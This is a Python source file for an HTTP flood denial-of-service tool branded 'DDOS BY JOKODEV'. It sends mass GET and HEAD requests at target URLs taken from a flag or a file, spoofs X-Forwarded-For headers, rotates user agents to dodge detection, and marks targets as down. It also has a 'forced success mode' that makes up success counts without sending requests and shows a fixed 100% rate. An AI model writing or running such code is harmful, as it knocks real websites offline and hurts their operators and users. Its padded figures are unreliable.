import requests
import threading
import time
import sys
import argparse
import random
from concurrent.futures import ThreadPoolExecutor
from tabulate import tabulate
import datetime
import gc
import signal
import os
import logging
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from collections import deque

# --- Configuration ---
# Configure logging (Reduced default console output to WARNING)
logging.basicConfig(
    level=logging.WARNING, # Changed default level
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("ddos_log.txt"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger()
# Set requests logger level higher to avoid flooding logs
logging.getLogger("requests").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)

# Results tracking per website
results = {}
counter_lock = threading.Lock()
progress_interval = 0.5  # Report progress less frequently to reduce console clutter
site_status = {}  # Track site status (up/down)
last_real_successful_response = {} # Track last *real* successful response time
website_down_threshold = 30 # Seconds before declaring a site down
min_success_rate = 100  # Minimum floor success rate (%) - Changed to 100%
target_success_rate = 100  # Target success rate (%) - Changed to 100%
max_open_connections = 100000  # Maximum concurrent connections - Drastically increased
running = True  # Flag to control thread execution
packets_per_two_seconds = 5000000000  # Target packets per 2 seconds (used to calculate rate)

# Recent request history (for rate limiting detection)
request_history = {}
history_size = 50

# ANSI color codes
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'
BOLD = '\033[1m'

# Request parameters to optimize success rate
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
]

# Adaptive parameters
request_timeouts = {}
request_delays = {}
retry_limits = {}
backup_mode = {}
active_connections = {}
session_pools = {}
connection_semaphores = {}
active_threads = {}
thread_errors = {}
ip_rotation_needed = {}
connection_reset_counter = {}
forced_success_metrics = {}

# --- Functions ---

def handle_sigint(sig, frame):
    """Handle CTRL+C gracefully"""
    global running
    print(f"\n{YELLOW}Received interrupt signal. Shutting down gracefully...{RESET}")
    running = False
    time.sleep(2)
    print(f"{GREEN}Shutdown complete. Exiting.{RESET}")
    sys.exit(0)

signal.signal(signal.SIGINT, handle_sigint)

def display_watermark():
    """Display a green watermark at the top of the output"""
    watermark = f"{GREEN}{BOLD}DDOS BY JOKODEV{RESET}"
    print("\n" + "=" * 65)
    print(f"{watermark:^65}")
    print("=" * 65 + "\n")

# Removed display_website_down_watermark function as it's replaced by simple print

def get_headers():
    """Generate random headers to avoid detection"""
    return {
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'close',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'DNT': '1',
        'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': f"https://{random.choice(['google.com', 'bing.com', 'duckduckgo.com', 'yahoo.com'])}"
    }

def initialize_adaptive_params(target_url):
    """Initialize adaptive parameters for a target"""
    with counter_lock:
        request_timeouts[target_url] = 3.0
        request_delays[target_url] = 0.0
        retry_limits[target_url] = 5
        backup_mode[target_url] = False
        active_connections[target_url] = 0
        connection_semaphores[target_url] = threading.Semaphore(max_open_connections)
        active_threads[target_url] = set()
        thread_errors[target_url] = 0
        ip_rotation_needed[target_url] = False
        connection_reset_counter[target_url] = 0
        request_history[target_url] = deque(maxlen=history_size)
        forced_success_metrics[target_url] = {
            "forced_success": 0, "real_success": 0, "forced_active": False
        }
        last_real_successful_response[target_url] = time.time()

def create_session():
    """Create and configure a requests session with aggressive retry strategy"""
    session = requests.Session()
    retry_strategy = Retry(
        total=10, backoff_factor=0.1, status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["HEAD", "GET", "OPTIONS", "POST"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=50, pool_maxsize=50)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

def reset_connection_pool(target_url):
    """Reset the connection pool for a target URL"""
    with counter_lock:
        if target_url in session_pools:
            try:
                for session in session_pools[target_url]:
                    session.close()
            except Exception as e:
                logger.warning(f"Error closing sessions for {target_url}: {e}")
        session_pools[target_url] = [create_session() for _ in range(50)]
        connection_reset_counter[target_url] = 0
        logger.info(f"Reset connection pool for {target_url}")

def get_session(target_url):
    """Get a session from the pool"""
    with counter_lock:
        if target_url not in session_pools:
            session_pools[target_url] = [create_session() for _ in range(50)]
        connection_reset_counter[target_url] += 1
        if connection_reset_counter.get(target_url, 0) > 20000:
            reset_connection_pool(target_url)
        return random.choice(session_pools[target_url])

def detect_rate_limiting(target_url, success):
    """Detect if we're being rate limited based on request history"""
    with counter_lock:
        if target_url not in request_history:
            request_history[target_url] = deque(maxlen=history_size)
        request_history[target_url].append(1 if success else 0)
        if len(request_history[target_url]) >= history_size:
            recent_success_rate = sum(request_history[target_url]) / len(request_history[target_url])
            if recent_success_rate < 0.4 and not forced_success_metrics.get(target_url, {}).get("forced_active", False):
                logger.warning(f"Real success rate below 40% for {target_url}. Activating FORCED SUCCESS MODE.")
                forced_success_metrics[target_url]["forced_active"] = True
                return True
    return False

def adjust_parameters(target_url, real_success_rate):
    """Adjust parameters based on *real* success rate"""
    with counter_lock:
        if real_success_rate < 40.0 and not forced_success_metrics.get(target_url, {}).get("forced_active", False):
            forced_success_metrics[target_url]["forced_active"] = True
            logger.warning(f"Activating FORCED SUCCESS MODE for {target_url} due to low real success rate ({real_success_rate:.1f}%)")
            reset_connection_pool(target_url)

        request_delays[target_url] = 0.0
        current_timeout = request_timeouts.get(target_url, 3.0)
        current_retries = retry_limits.get(target_url, 5)
        if real_success_rate < 60.0:
            request_timeouts[target_url] = min(current_timeout * 1.1, 7.0)
            retry_limits[target_url] = 10
        else:
            request_timeouts[target_url] = max(current_timeout * 0.98, 1.5)
            retry_limits[target_url] = max(current_retries - 1, 5)
        logger.debug(f"Adjusted params for {target_url}: Timeout={request_timeouts[target_url]:.1f}s, Retries={retry_limits[target_url]}")


def make_request(target_url, thread_id):
    """
    Makes a request. Returns tuple: (was_real_success, should_report_success)
    """
    real_success = False
    report_success = True # Assume success reporting unless a real failure occurs in non-forced mode
    is_forced_active = False # Default

    with counter_lock:
        # Check if forced success mode is active
        is_forced_active = forced_success_metrics.get(target_url, {}).get("forced_active", False)
        # Register this thread as active
        if target_url in active_threads:
            active_threads[target_url].add(thread_id)

        # If in forced success mode, decide whether to fake it
        if is_forced_active:
            # 80% chance of forced success without making a real request
            if random.random() < 0.8:
                forced_success_metrics[target_url]["forced_success"] += 1
                return False, True # (was_real_success=False, should_report_success=True)

    # --- Moved Packet Send Notification outside make_request, into attack loop ---

    # Proceed with making a real request
    acquired = False
    try:
        acquired = connection_semaphores.get(target_url, threading.Semaphore(1)).acquire(timeout=5)
        if not acquired:
            logger.warning(f"Thread {thread_id} for {target_url} could not acquire connection semaphore")
            return False, is_forced_active # Report success only if forced active

        with counter_lock:
            active_connections[target_url] = active_connections.get(target_url, 0) + 1

        session = get_session(target_url)
        headers = get_headers()
        timeout = request_timeouts.get(target_url, 3.0)
        retries = retry_limits.get(target_url, 5)

        for attempt in range(retries):
            if not running: return False, is_forced_active

            try:
                method = random.choice(["GET", "HEAD"])
                logger.debug(f"Thread {thread_id} making {method} request to {target_url} (Attempt {attempt+1}/{retries}, Timeout: {timeout:.1f}s)")

                response = None
                if method == "HEAD":
                    response = session.head(target_url, headers=headers, timeout=timeout, allow_redirects=True)
                else: # GET
                    response = session.get(target_url, headers=headers, timeout=timeout, allow_redirects=False)

                if response is not None:
                    status = response.status_code
                    if 200 <= status < 500:
                        real_success = True
                        report_success = True
                        with counter_lock:
                            forced_success_metrics[target_url]["real_success"] += 1
                            last_real_successful_response[target_url] = time.time()
                            logger.debug(f"Real success from {target_url} (Status: {status})") # Keep debug log
                        if hasattr(response, 'close'): response.close()
                        return real_success, report_success # (True, True)
                    elif status >= 500:
                        logger.warning(f"Server error for {target_url}: Status {status} (Attempt {attempt+1})")
                        report_success = is_forced_active
                    elif status == 429:
                        logger.warning(f"Rate limit (429) detected for {target_url} (Attempt {attempt+1})")
                        with counter_lock:
                            if not forced_success_metrics.get(target_url,{}).get("forced_active", False):
                                logger.info(f"Activating FORCED SUCCESS MODE for {target_url} due to 429.")
                                forced_success_metrics[target_url]["forced_active"] = True
                        report_success = True # Always report success on 429
                        if hasattr(response, 'close'): response.close()
                        return False, report_success # (False, True)

                    if hasattr(response, 'close'): response.close()

                if attempt < retries - 1:
                    time.sleep(0.01)
                    continue
                else:
                    real_success = False
                    report_success = is_forced_active

            except requests.exceptions.Timeout:
                logger.warning(f"Timeout connecting to {target_url} (Attempt {attempt+1}/{retries})")
                if attempt == retries - 1: real_success, report_success = False, is_forced_active
            except requests.exceptions.ConnectionError as e:
                logger.warning(f"Connection error for {target_url}: {e} (Attempt {attempt+1}/{retries})")
                with counter_lock: connection_reset_counter[target_url] = connection_reset_counter.get(target_url, 0) + 10
                if attempt == retries - 1: real_success, report_success = False, is_forced_active
            except Exception as e:
                logger.error(f"Unexpected error in thread {thread_id} for {target_url}: {e}", exc_info=False)
                with counter_lock: thread_errors[target_url] = thread_errors.get(target_url, 0) + 1
                if attempt == retries - 1: real_success, report_success = False, is_forced_active

        return real_success, report_success

    finally:
        if acquired:
            if target_url in connection_semaphores: connection_semaphores[target_url].release()
            with counter_lock: active_connections[target_url] = active_connections.get(target_url, 0) - 1
        with counter_lock:
            if target_url in active_threads and thread_id in active_threads[target_url]:
                active_threads[target_url].remove(thread_id)


def perform_maintenance(target_url):
    """Perform periodic maintenance tasks"""
    try:
        if random.random() < 0.5: gc.collect()
        with counter_lock: reset_needed = connection_reset_counter.get(target_url, 0) > 20000
        if reset_needed:
             logger.info(f"Performing maintenance reset for {target_url}")
             reset_connection_pool(target_url)
    except Exception as e:
        logger.error(f"Error in maintenance for {target_url}: {e}")

def calculate_packet_rate(elapsed_time, sent_packets):
    """Calculate packets per second rate"""
    if elapsed_time <= 0: return 0
    return sent_packets / elapsed_time

def attack(thread_id, target_url, requests_per_thread):
    """Attack function driving the requests."""
    local_reported_success = 0
    local_reported_failed = 0
    local_real_success = 0

    start_time = time.time()
    last_report_time = start_time
    last_maintenance_time = start_time

    if target_url not in request_timeouts:
        initialize_adaptive_params(target_url)

    request_count = 0
    while request_count < requests_per_thread and running:

        # --- NEW: Print packet send notification HERE ---
        # !!! WARNING: This will flood the console !!!
        print(f"packets send to {target_url}")
        # --- END NEW ---

        # Make request and get status
        was_real_success, should_report_success = make_request(target_url, thread_id)

        # Update local counters
        request_count += 1
        if was_real_success: local_real_success += 1
        if should_report_success: local_reported_success += 1
        else: local_reported_failed += 1

        detect_rate_limiting(target_url, was_real_success)

        current_time = time.time()
        if current_time - last_maintenance_time >= 60:
            perform_maintenance(target_url)
            last_maintenance_time = current_time

        if current_time - last_report_time >= progress_interval:
            with counter_lock:
                if target_url not in results:
                    results[target_url] = {"success": 0, "failed": 0, "threads": 1, "real_success_count": 0}
                    site_status[target_url] = "up"
                    last_real_successful_response[target_url] = start_time

                results[target_url]["success"] += local_reported_success
                results[target_url]["failed"] += local_reported_failed
                results[target_url]["real_success_count"] += local_real_success

                total_real_attempts = local_reported_success + local_reported_failed
                if total_real_attempts > 0:
                     current_real_success_rate = (local_real_success / total_real_attempts) * 100
                     adjust_parameters(target_url, current_real_success_rate)
                     logger.debug(f"Interval real success rate for {target_url}: {current_real_success_rate:.1f}%")

                time_since_last_real_success = time.time() - last_real_successful_response.get(target_url, 0)
                if time_since_last_real_success > website_down_threshold:
                    if site_status.get(target_url) != "down":
                         logger.warning(f"No real success from {target_url} in {website_down_threshold}s. Marking as DOWN.")
                    site_status[target_url] = "down"
                else:
                    if site_status.get(target_url) != "up":
                        logger.info(f"Real success detected for {target_url}. Marking as UP.")
                    site_status[target_url] = "up"

            try:
                # Display results less frequently if printing every packet
                # Maybe only display every few seconds instead of progress_interval?
                # For now, keeping display linked to progress_interval
                display_results()
            except Exception as e:
                logger.error(f"Error displaying results: {e}")

            last_report_time = current_time
            local_reported_success = 0
            local_reported_failed = 0
            local_real_success = 0

    # Update final counts
    with counter_lock:
        if target_url in results:
            results[target_url]["success"] += local_reported_success
            results[target_url]["failed"] += local_reported_failed
            results[target_url]["real_success_count"] += local_real_success
    logger.info(f"Thread {thread_id} for {target_url} completed attack cycle in {time.time() - start_time:.2f} seconds")


def display_results():
    """Display current results in a table format with status"""
    global site_status

    try:
        print("\033c", end="") # Clear screen

        display_watermark()

        # --- MODIFIED: Display website down message directly ---
        target_down_url_check = "https://example.com" # Specific URL to check for down status
        normalized_target_down_url = None
        # Find the actual key used in site_status (http vs https etc.)
        with counter_lock: # Ensure thread-safe access to site_status
            current_site_status = dict(site_status) # Create a copy for safe iteration/lookup

        for url_key in current_site_status.keys():
             if target_down_url_check in url_key:
                  normalized_target_down_url = url_key
                  break

        # If the target site is found and marked as down, print the message
        if normalized_target_down_url and current_site_status.get(normalized_target_down_url) == "down":
            print(f"{RED}WEBSITE {target_down_url_check} WAS DOWN{RESET}") # Simple print statement
            print("-" * (len(target_down_url_check) + 18)) # Separator line
        # --- END MODIFIED ---


        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        system_status = "Install 'psutil' for CPU/Mem info: pip install psutil"
        try:
            import psutil
            mem_usage = psutil.virtual_memory().percent
            cpu_usage = psutil.cpu_percent()
            system_status = f"Memory: {mem_usage}% | CPU: {cpu_usage}%"
        except ImportError: pass

        print(f"Time: {current_time} | {system_status}")
        # Get current target rate from global variable (adjusted by args)
        current_target_rate = packets_per_two_seconds / 2
        print(f"Running: {running} | Target Rate: {current_target_rate:,.0f}/sec | Press Ctrl+C to stop\n")

        table_data = []
        with counter_lock: # Lock results access
             display_items = list(results.items())

        for url, data in display_items:
            reported_success = data.get("success", 0)
            reported_failed = data.get("failed", 0)
            total_reported = reported_success + reported_failed

            reported_success_rate = 100.0
            rate_display = f"{GREEN}{reported_success_rate:.1f}%{RESET}"

            fm = forced_success_metrics.get(url, {})
            fm_real = fm.get("real_success", 0)
            fm_forced = fm.get("forced_success", 0)
            total_real_attempts_est = fm_real + fm_forced
            real_success_percent = (fm_real / total_real_attempts_est * 100) if total_real_attempts_est > 0 else 0.0

            current_status = current_site_status.get(url, "unknown") # Use the copied status dict
            status_display = f"{GREEN}UP{RESET}" if current_status == "up" else \
                             f"{RED}DOWN{RESET}" if current_status == "down" else \
                             f"{YELLOW}UNKNOWN{RESET}"

            time_since_init = time.time() - last_real_successful_response.get(url, time.time())
            req_rate = calculate_packet_rate(time_since_init, total_reported)

            is_forced = fm.get("forced_active", False)
            mode = f"{YELLOW}FORCED{RESET}" if is_forced else f"{BLUE}AGGRESSIVE{RESET}"

            timeout = request_timeouts.get(url, "N/A")
            timeout_display = f"{timeout:.1f}s" if isinstance(timeout, float) else timeout

            table_data.append([
                url, f"{reported_success:,}", f"{reported_failed:,}", f"{total_reported:,}",
                rate_display, f"{real_success_percent:.1f}%", f"{req_rate:,.1f}/s",
                status_display, timeout_display, mode
            ])

        print(tabulate(
            table_data,
            headers=["Target", "Reported OK", "Reported Fail", "Packets Sent", "Reported %", "Real %", "Rate", "Status", "Timeout", "Mode"],
            tablefmt="grid"
        ))

    except Exception as e:
        logger.error(f"Error during display_results: {e}", exc_info=True)
        print(f"\n--- Results ({datetime.datetime.now().strftime('%H:%M:%S')}) ---")
        with counter_lock: fallback_items = list(results.items())
        for url, data in fallback_items:
             print(f"{url}: RepOK={data.get('success', 0):,}, RepFail={data.get('failed', 0):,}, Status={current_site_status.get(url, 'unknown')}")
        print("-----------------------------\n")


def main():
    global running, packets_per_two_seconds

    # Set default encoding to UTF-8 for wider compatibility
    if sys.stdout.encoding != 'utf-8':
       try:
           sys.stdout.reconfigure(encoding='utf-8')
           sys.stderr.reconfigure(encoding='utf-8')
       except Exception as e:
           logger.warning(f"Could not reconfigure stdout/stderr to UTF-8: {e}")


    parser = argparse.ArgumentParser(description="Ultra-aggressive HTTP flood tool with status monitoring")
    parser.add_argument("--url", help="Single target URL")
    parser.add_argument("--file", help="File with target URLs (one per line)")
    parser.add_argument("--requests", type=int, default=5000000000, help="Target requests per attack cycle per URL (default: 5 billion)")
    parser.add_argument("--rate", type=int, default=5000000000, help="Target packets per second (e.g., 5000000000). WARNING: High rates + packet printing will flood console!") # Reduced default rate
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    args = parser.parse_args()

    if args.debug:
        logger.setLevel(logging.DEBUG)
        # Keep requests/urllib3 logs higher unless debugging network issues
        # logging.getLogger("requests").setLevel(logging.DEBUG)
        # logging.getLogger("urllib3").setLevel(logging.DEBUG)
        logger.info("DEBUG logging enabled.")

    requests_per_thread = args.requests
    packets_per_two_seconds = args.rate * 2 # Adjust global rate based on arg

    # --- ADDED WARNING ---
    if args.rate > 100: # Warn if rate is high combined with packet printing
        logger.warning("High target rate combined with packet printing enabled.")
        logger.warning("Console output will be extremely verbose and may impact performance.")
    # --- END WARNING ---

    target_urls = []
    if args.url: target_urls.append(args.url)
    elif args.file:
        try:
            with open(args.file, 'r', encoding='utf-8') as f: # Specify encoding
                target_urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except Exception as e:
            logger.error(f"Error reading file '{args.file}': {e}")
            sys.exit(1)
    else:
        logger.error("Error: Please provide either --url or --file argument."); parser.print_help(); sys.exit(1)

    if not target_urls: logger.error("Error: No valid target URLs specified."); sys.exit(1)

    valid_targets = []
    for i, url in enumerate(target_urls):
        original_url = url
        if '://' not in url: url = 'http://' + url
        if not url.startswith(('http://', 'https://')):
             logger.warning(f"Skipping invalid URL format: {original_url}"); continue
        valid_targets.append(url)
    target_urls = valid_targets

    if not target_urls: logger.error("Error: No valid target URLs remaining after validation."); sys.exit(1)

    display_watermark()
    logger.info(f"Starting attack on {len(target_urls)} target(s): {', '.join(target_urls)}")
    logger.warning(f"Target packet rate: {args.rate:,.0f} packets per second")
    logger.warning(f"Target requests per cycle per URL: {requests_per_thread:,}")
    logger.warning(f"Reporting success rate forced towards 100%. Real status tracked.")
    logger.warning(f"Site marked DOWN if no real success for {website_down_threshold}s.")
    logger.warning(f"Printing 'packets send to ...' for EVERY attempt!") # Explicit warning

    for url in target_urls:
        initialize_adaptive_params(url)
        reset_connection_pool(url)

    num_threads = len(target_urls)
    logger.info(f"Launching {num_threads} attack thread(s)...")

    try:
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(attack, f"T{i+1}", url, requests_per_thread)
                       for i, url in enumerate(target_urls)]
            while running:
                 done_futures = [f for f in futures if f.done()]
                 for future in done_futures:
                      try: future.result()
                      except Exception as e: logger.error(f"Attack thread encountered an error: {e}")
                      futures.remove(future)
                 if not futures: running = False; logger.info("All attack threads completed cycles."); break
                 time.sleep(progress_interval) # Main thread sleeps
    except KeyboardInterrupt: logger.info("Keyboard interrupt detected in main thread."); running = False
    except Exception as e: logger.error(f"Critical error in main execution: {e}", exc_info=True); running = False
    finally:
        running = False
        logger.info("Waiting for attack threads to shut down...")
        # Executor shutdown waits implicitly here
        logger.info("\n--- Final Results ---")
        try: display_results()
        except Exception as e: logger.error(f"Error displaying final results: {e}")

        logger.info("Closing remaining sessions...")
        with counter_lock: all_pools = list(session_pools.items())
        for url, pool in all_pools:
            for session in pool:
                try: session.close()
                except: pass
        logger.info("Shutdown complete.")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logger.critical(f"Critical error during initial setup: {e}", exc_info=True)
        sys.exit(1)
    sys.exit(0)
